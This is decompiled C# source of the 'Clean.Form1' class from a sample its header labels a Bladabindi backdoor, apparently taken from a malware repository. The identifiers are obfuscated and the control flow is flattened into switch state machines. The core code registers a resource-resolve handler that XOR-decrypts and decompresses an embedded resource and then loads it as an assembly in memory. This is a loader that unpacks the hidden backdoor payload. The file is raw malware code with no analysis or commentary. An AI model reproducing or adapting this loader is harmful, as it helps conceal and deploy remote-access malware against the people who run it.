// Decompiled with JetBrains decompiler
// Type: Clean.Form1
// Assembly: Clean, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 958D9B28-BCA8-467B-B5F1-19B14D181F81
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Backdoor.MSIL.Bladabindi.gen-646ae7c4ec7357953b07a88fe5928f2e486e4c7ee1ff639d817f662f19117c4a.exe

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Windows.Forms;

namespace Clean
{
  public class Form1 : Form
  {
    private Ⴐ.Ⴀ.Ⴀ Ⴗ;
    private static bool ႥႥ;

    public Form1()
    {
      this.Ⴗ.Ⴗ = (IContainer) null;
      // ISSUE: explicit constructor call
      base.\u002Ector();
      this.Ⴃ();
    }

    private void Ⴍ(object Ⴀ, EventArgs Ⴃ)
    {
    }

    protected override void Dispose(bool disposing)
    {
      int num1 = 6;
      while (true)
      {
        int num2;
        switch (num1)
        {
          case 0:
            num2 = this.Ⴗ.Ⴗ != null ? 1 : 0;
            break;
          case 1:
            goto label_8;
          case 2:
            num2 = 0;
            break;
          case 3:
            goto label_7;
          case 4:
            this.Ⴗ.Ⴗ.Dispose();
            num1 = 3;
            continue;
          case 7:
            goto label_9;
          default:
            num1 = !disposing ? 2 : 0;
            continue;
        }
        num1 = num2 == 0 ? 3 : 4;
      }
label_8:
      return;
label_9:
      return;
label_7:
      base.Dispose(disposing);
    }

    private void Ⴃ()
    {
      int num = 13;
      while (true)
      {
        switch (num)
        {
          case 0:
            goto label_19;
          case 1:
            Form1.Ⴐ((ContainerControl) this, new SizeF(6f, 13f), 700, 719);
            num = 11;
            continue;
          case 2:
            this.Text = Ⴐ.Ⴍ.Ⴗ(1157539843, 5);
            this.Load += new EventHandler(this.Ⴍ);
            num = 15;
            continue;
          case 3:
            Ⴐ.Ⴀ.Ⴈ((Control) this, 418, 385).Add((Control) this.Ⴗ.Ⴈ);
            num = 17;
            continue;
          case 4:
            Ⴐ.Ⴀ.Ⴃ((Control) this.Ⴗ.Ⴈ, Ⴐ.Ⴍ.Ⴗ(1157539867, 8), 366, 331);
            num = 7;
            continue;
          case 5:
            Ⴐ.Ⴀ.Ⴃ((Control) this.Ⴗ.Ⴃ, Ⴐ.Ⴍ.Ⴗ(1157539883, 7), 560, 533);
            num = 9;
            continue;
          case 6:
            Ⴐ.Ⴍ.Ⴈ.Ⴃ.Ⴐ((Control) this, 943, 921);
            Ⴐ.Ⴍ.Ⴈ.Ⴃ.Ⴓ((Control) this.Ⴗ.Ⴃ, new Point(0, 0), 529, 554);
            num = 5;
            continue;
          case 7:
            Form1.Ⴄ((Control) this.Ⴗ.Ⴈ, new Size(436, 20), 841, 768);
            num = 10;
            continue;
          case 8:
            Ⴐ.Ⴍ.ႳႨ((Form) this, new Size(800, 450), 993, 966);
            num = 3;
            continue;
          case 9:
            Form1.Ⴄ((Control) this.Ⴗ.Ⴃ, new Size(521, 20), 267, 322);
            goto case 14;
          case 10:
            Form1.Ⴀ((Control) this.Ⴗ.Ⴈ, 1, 224, 184);
            num = 1;
            continue;
          case 11:
            Ⴐ.Ⴀ.Ⴓ((ContainerControl) this, AutoScaleMode.Font, 132, 248);
            goto case 8;
          case 12:
            Form1.Ⴀ((Control) this.Ⴗ.Ⴃ, 0, 334, 278);
            num = 16;
            continue;
          case 14:
            num = 12;
            continue;
          case 15:
            goto label_18;
          case 16:
            Ⴐ.Ⴍ.Ⴈ.Ⴃ.Ⴓ((Control) this.Ⴗ.Ⴈ, new Point(365, 0), 956, 903);
            num = 4;
            continue;
          case 17:
            this.Controls.Add((Control) this.Ⴗ.Ⴃ);
            this.Name = Ⴐ.Ⴍ.Ⴗ(1157539846, 0);
            num = 2;
            continue;
          default:
            this.Ⴗ.Ⴃ = new TextBox();
            this.Ⴗ.Ⴈ = new TextBox();
            num = 6;
            continue;
        }
      }
label_18:
      this.ResumeLayout(false);
label_19:
      this.PerformLayout();
    }

    internal static Assembly ႥႠ(object sender, ResolveEventArgs args)
    {
label_3:
      int num1 = !Ⴐ.Ⴍ.Ⴈ.Ⴃ.Ⴄ(Ⴐ.Ⴍ.ႳႠ(args, 129, 139), Ⴐ.Ⴀ.Ⴅ(1, 23), 807, 878) ? 12 : 17;
      string str1;
      string name;
      string str2;
      AppDomain appDomain;
      Dictionary<string, string> dictionary;
      Assembly assembly;
      Stream stream;
      byte[] buffer;
      int num2;
      int index1;
      while (true)
      {
        switch (num1)
        {
          case 0:
            appDomain = Form1.Ⴅ(207, 170);
            dictionary = (Dictionary<string, string>) Form1.Ⴓ(appDomain, str2, 796, 789);
            num1 = 11;
            continue;
          case 1:
            goto label_21;
          case 2:
            num1 = 14;
            continue;
          case 3:
            dictionary = new Dictionary<string, string>();
            Form1.Ⴜ(appDomain, str2, (object) dictionary, 165, 142);
            goto case 5;
          case 4:
            goto label_3;
          case 5:
          case 15:
            num1 = 7;
            continue;
          case 7:
            assembly = Ⴐ.Ⴀ.Ⴅ(806, 817);
            stream = Ⴐ.Ⴍ.Ⴈ.Ⴀ(assembly, str1, 908, 981);
            num1 = 9;
            continue;
          case 8:
            ++index1;
            num1 = 14;
            continue;
          case 9:
            num1 = stream != null ? 13 : 16;
            continue;
          case 10:
            num2 = Ⴐ.Ⴍ.Ⴈ.Ⴗ(stream, 862, 839);
            Ⴐ.Ⴍ.Ⴈ.Ⴃ.Ⴈ(stream, buffer, 0, buffer.Length, 138, 152);
            num1 = 18;
            continue;
          case 11:
            if (dictionary == null)
            {
              num1 = 3;
              continue;
            }
            goto label_41;
          case 12:
            str1 = Ⴐ.Ⴍ.Ⴗ(1157539852, 2);
            name = str1;
            str2 = Ⴐ.Ⴀ.Ⴜ((object) name, (object) '1', 729, 752);
            num1 = 0;
            continue;
          case 13:
            buffer = new byte[Ⴐ.Ⴀ.ႷႠ(stream, 357, 258) - 1L];
            num1 = 10;
            continue;
          case 14:
            num1 = index1 < buffer.Length ? 19 : 1;
            continue;
          case 16:
            goto label_13;
          case 17:
            goto label_4;
          case 18:
            index1 = 0;
            goto case 2;
          case 19:
            buffer[index1] ^= (byte) (index1 + num2 & (int) byte.MaxValue);
            num1 = 8;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Form1.ႥႠ);
            num1 = 4;
            continue;
        }
      }
label_4:
      return (Assembly) null;
label_13:
      return (Assembly) null;
label_21:
      MemoryStream memoryStream = new MemoryStream();
      DeflateStream deflateStream = new DeflateStream((Stream) new MemoryStream(buffer), CompressionMode.Decompress, true);
      try
      {
        int num3 = 3;
        byte[] numArray;
        int num4;
        while (true)
        {
          switch (num3)
          {
            case 0:
            case 2:
              Form1.ႥႨ((Stream) memoryStream, numArray, 0, num4, 714, 682);
              goto case 6;
            case 1:
            case 4:
              goto label_32;
            case 6:
            case 7:
              num3 = (num4 = Ⴐ.Ⴍ.Ⴈ.Ⴃ.Ⴈ((Stream) deflateStream, numArray, 0, numArray.Length, 612, 631)) > 0 ? 0 : 4;
              continue;
            default:
              numArray = new byte[1024];
              num3 = 7;
              continue;
          }
        }
      }
      finally
      {
        int num5 = 0;
        while (true)
        {
          switch (num5)
          {
            case 1:
              goto label_30;
            case 2:
            case 5:
              goto label_31;
            default:
              num5 = deflateStream == null ? 2 : 1;
              continue;
          }
        }
label_30:
        deflateStream.Dispose();
label_31:;
      }
label_32:
      int num6 = 7;
label_33:
      Assembly data;
      string[] manifestResourceNames;
      int index2;
      while (true)
      {
        switch (num6)
        {
          case 0:
            num6 = index2 < manifestResourceNames.Length ? 1 : 9;
            continue;
          case 1:
            string key = manifestResourceNames[index2];
            dictionary[key] = key;
            goto case 5;
          case 2:
          case 4:
            goto label_43;
          case 3:
            goto label_44;
          case 5:
            ++index2;
            num6 = 0;
            continue;
          case 6:
            manifestResourceNames = data.GetManifestResourceNames();
            index2 = 0;
            num6 = 0;
            continue;
          case 9:
            num6 = 10;
            continue;
          case 10:
            num6 = !dictionary.ContainsKey(args.Name) ? 3 : 2;
            continue;
          case 11:
            appDomain.SetData(name, (object) data);
            goto case 6;
          case 12:
            goto label_41;
          default:
            data = Assembly.Load(Ⴐ.Ⴀ.ႷႷ(memoryStream, 279, 323), (byte[]) null, assembly.Evidence);
            num6 = 11;
            continue;
        }
      }
label_43:
      return data;
label_44:
      return (Assembly) null;
label_41:
      data = (Assembly) appDomain.GetData(name);
      num6 = 10;
      goto label_33;
    }

    [SecuritySafeCritical]
    static Form1() => Form1.ႥႤ();

    [SecuritySafeCritical]
    internal static void Ⴈ([In] int obj0, [In] int obj1)
    {
      int num1 = 5;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 1:
          case 3:
            num1 = 5;
            continue;
          case 2:
            goto label_8;
          case 4:
            goto label_7;
          default:
            int num2;
            switch (obj1 ^ obj0)
            {
              case 26:
                num2 = 4;
                break;
              default:
                num2 = 0;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_8:
      return;
label_7:
      Application.EnableVisualStyles();
    }

    [SecuritySafeCritical]
    internal static AppDomain Ⴅ([In] int obj0, [In] int obj1)
    {
label_3:
      int num1;
      switch (obj1 ^ obj0)
      {
        case 100:
          num1 = 2;
          break;
        case 101:
          num1 = 1;
          break;
        default:
          num1 = 8;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
            num2 = 4;
            continue;
          case 1:
          case 5:
            goto label_10;
          case 2:
            goto label_9;
          case 3:
          case 4:
            goto label_3;
          case 7:
          case 8:
            num2 = 4;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Form1.Ⴅ);
            num2 = 4;
            continue;
        }
      }
label_9:
      return AppDomain.CurrentDomain;
label_10:
      return AppDomain.CurrentDomain;
    }

    [SecuritySafeCritical]
    internal static void Ⴄ([In] Control obj0, [In] Size obj1, [In] int obj2, [In] int obj3)
    {
      int num1 = 3;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 5:
            goto label_7;
          case 1:
            num1 = 3;
            continue;
          case 4:
            goto label_8;
          default:
            int num2;
            switch (obj3 ^ obj2)
            {
              case 73:
                num2 = 0;
                break;
              default:
                num2 = 1;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_8:
      return;
label_7:
      obj0.Size = obj1;
    }

    [SecuritySafeCritical]
    internal static void Ⴀ([In] Control obj0, [In] int obj1, [In] int obj2, [In] int obj3)
    {
      int num1 = 5;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 1:
            num1 = 5;
            continue;
          case 2:
          case 3:
            goto label_7;
          case 4:
            goto label_8;
          default:
            int num2;
            switch (obj3 ^ obj2)
            {
              case 88:
                num2 = 2;
                break;
              default:
                num2 = 0;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_8:
      return;
label_7:
      obj0.TabIndex = obj1;
    }

    [SecuritySafeCritical]
    internal static void Ⴐ([In] ContainerControl obj0, [In] SizeF obj1, [In] int obj2, [In] int obj3)
    {
      int num1 = 2;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 4:
          case 5:
            goto label_7;
          case 1:
          case 3:
            num1 = 2;
            continue;
          default:
            int num2;
            switch (obj3 ^ obj2)
            {
              case 115:
                num2 = 4;
                break;
              default:
                num2 = 3;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_7:
      obj0.AutoScaleDimensions = obj1;
    }

    [SecuritySafeCritical]
    internal static object Ⴓ([In] AppDomain obj0, [In] string obj1, [In] int obj2, [In] int obj3)
    {
label_3:
      int num1;
      switch (obj3 ^ obj2)
      {
        case 9:
          num1 = 3;
          break;
        default:
          num1 = 0;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 1:
          case 2:
            num2 = 6;
            continue;
          case 3:
            goto label_8;
          case 4:
          case 5:
            num2 = 6;
            continue;
          case 6:
            goto label_3;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Form1.Ⴓ);
            num2 = 6;
            continue;
        }
      }
label_8:
      return obj0.GetData(obj1);
    }

    [SecuritySafeCritical]
    internal static void Ⴜ([In] AppDomain obj0, [In] string obj1, [In] object obj2, [In] int obj3, [In] int obj4)
    {
      int num1 = 5;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 1:
            goto label_7;
          case 2:
          case 3:
            num1 = 5;
            continue;
          default:
            int num2;
            switch (obj4 ^ obj3)
            {
              case 43:
                num2 = 0;
                break;
              default:
                num2 = 3;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_7:
      obj0.SetData(obj1, obj2);
    }

    [SecuritySafeCritical]
    internal static void ႥႨ([In] Stream obj0, [In] byte[] obj1, [In] int obj2, [In] int obj3, [In] int obj4, [In] int obj5)
    {
      int num1 = 5;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 4:
            num1 = 5;
            continue;
          case 1:
          case 2:
            goto label_7;
          default:
            int num2;
            switch (obj5 ^ obj4)
            {
              case 96:
                num2 = 2;
                break;
              default:
                num2 = 4;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_7:
      obj0.Write(obj1, obj2, obj3);
    }

    [SecuritySafeCritical]
    internal static void ႥႤ()
    {
      int num1 = 2;
      while (true)
      {
        switch (num1)
        {
          case 1:
          case 3:
          case 4:
            goto label_4;
          default:
            if (!Form1.ႥႥ)
            {
              num1 = 3;
              continue;
            }
            goto label_10;
        }
      }
label_10:
      return;
label_4:
      lock (typeof (Form1))
      {
        int num2 = 3;
        while (true)
        {
          switch (num2)
          {
            case 0:
              Form1.ႥႥ = true;
              goto case 2;
            case 2:
              AppDomain.CurrentDomain.ResourceResolve += new ResolveEventHandler(Form1.ႥႠ);
              num2 = 5;
              continue;
            case 5:
              goto label_12;
            default:
              num2 = Form1.ႥႥ ? 5 : 0;
              continue;
          }
        }
      }
label_12:
      int num3 = 4;
      while (true)
      {
        switch (num3)
        {
          case 0:
          case 1:
          case 3:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Form1.ႥႤ);
            num3 = 2;
            continue;
          case 2:
            goto label_16;
          case 5:
            goto label_17;
          default:
            num3 = 2;
            continue;
        }
      }
label_16:
      return;
label_17:;
    }
  }
}
